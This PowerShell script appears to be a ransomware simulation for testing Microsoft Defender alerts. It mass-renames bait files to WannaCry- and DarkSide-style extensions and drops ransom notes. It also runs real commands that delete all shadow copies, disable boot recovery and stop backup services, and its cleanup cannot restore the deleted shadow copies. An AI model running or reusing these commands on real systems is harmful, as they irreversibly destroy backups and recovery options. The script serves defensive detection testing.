# Ransomware Simulation - Triggers MDE Ransomware Alerts
# Run on DC01 or SMB01 via RDP
$ErrorActionPreference = "Continue"

Write-Host "Phase 1: Creating bait files in monitored locations"
$targets = @(
    "$env:USERPROFILE\Documents\ransom_test",
    "$env:USERPROFILE\Desktop\ransom_test",
    "C:\temp\ransom_test"
)
foreach ($dir in $targets) {
    New-Item -ItemType Directory $dir -Force | Out-Null
    1..100 | ForEach-Object {
        "Confidential Q4 Financial Report Row $_" | Out-File "$dir\finance_report_$_.docx"
        "Employee Record $_" | Out-File "$dir\employee_$_.xlsx"
    }
}
Write-Host "  600 bait files created across 3 directories"
Start-Sleep 5

Write-Host "Phase 2: Mass encryption via cmd.exe (single process tree)"
# Use cmd.exe + ren — MDE flags non-PowerShell processes doing mass renames
$bat = "$env:TEMP\sim_encrypt.bat"
@"
@echo off
for /R "$env:USERPROFILE\Documents\ransom_test" %%f in (*.docx *.xlsx) do ren "%%f" "%%~nxf.WNCRY"
for /R "$env:USERPROFILE\Desktop\ransom_test" %%f in (*.docx *.xlsx) do ren "%%f" "%%~nxf.WNCRY"
for /R "C:\temp\ransom_test" %%f in (*.docx *.xlsx) do ren "%%f" "%%~nxf.WNCRY"
echo YOUR FILES HAVE BEEN ENCRYPTED > "$env:USERPROFILE\Documents\ransom_test\@README_DECRYPT@.txt"
echo PAY 5 BTC TO bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh >> "$env:USERPROFILE\Documents\ransom_test\@README_DECRYPT@.txt"
echo YOUR FILES HAVE BEEN ENCRYPTED > "$env:USERPROFILE\Desktop\ransom_test\@README_DECRYPT@.txt"
echo YOUR FILES HAVE BEEN ENCRYPTED > "C:\temp\ransom_test\@README_DECRYPT@.txt"
"@ | Out-File $bat -Encoding ASCII
cmd.exe /c $bat
Write-Host "  Mass rename to .WNCRY complete (WannaCry-style extension)"
Start-Sleep 5

Write-Host "Phase 3: Shadow copy deletion (T1490)"
cmd.exe /c "vssadmin delete shadows /all /quiet" 2>$null
cmd.exe /c "wmic shadowcopy delete" 2>$null
Start-Sleep 3

Write-Host "Phase 4: Disable recovery (T1490)"
cmd.exe /c "bcdedit /set {default} recoveryenabled no" 2>$null
Start-Sleep 10

Write-Host "Phase 5: Stop backup services (T1489)"
cmd.exe /c "net stop VSS /y" 2>$null
cmd.exe /c "net stop wbengine /y" 2>$null
cmd.exe /c "net stop SDRSVC /y" 2>$null
Start-Sleep 5

Write-Host "Phase 6: Second wave - different extension (T1486)"
$dir4 = "C:\temp\ransom_wave2"
New-Item -ItemType Directory $dir4 -Force | Out-Null
1..150 | ForEach-Object { "Patient Medical Record $_ - HIPAA" | Out-File "$dir4\record_$_.pdf" }
$bat2 = "$env:TEMP\sim_encrypt2.bat"
@"
@echo off
for /R "C:\temp\ransom_wave2" %%f in (*.pdf) do ren "%%f" "%%~nxf.DARKSIDE"
echo DARKSIDE RANSOMWARE v3.0 > "C:\temp\ransom_wave2\RECOVER_FILES.txt"
echo All files encrypted. No free decryptor. >> "C:\temp\ransom_wave2\RECOVER_FILES.txt"
"@ | Out-File $bat2 -Encoding ASCII
cmd.exe /c $bat2
Write-Host "  150 files renamed to .DARKSIDE"
Start-Sleep 5

Write-Host ""
Write-Host "Waiting 120 seconds for MDE cloud analysis before cleanup..."
Start-Sleep 120

Write-Host "Cleanup: Restoring system state"
bcdedit /set {default} recoveryenabled yes 2>$null
Start-Service VSS -ErrorAction SilentlyContinue
Start-Service wbengine -ErrorAction SilentlyContinue
foreach ($dir in $targets) { Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue }
Remove-Item "C:\temp\ransom_wave2" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $bat, $bat2 -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "Done. Expected ransomware alerts (15-60 min):"
Write-Host "  - Ransomware activity detected"
Write-Host "  - Suspicious file rename activity" 
Write-Host "  - Shadow copy deletion"
Write-Host "  - Recovery disabled"
Write-Host "  - Backup service stopped"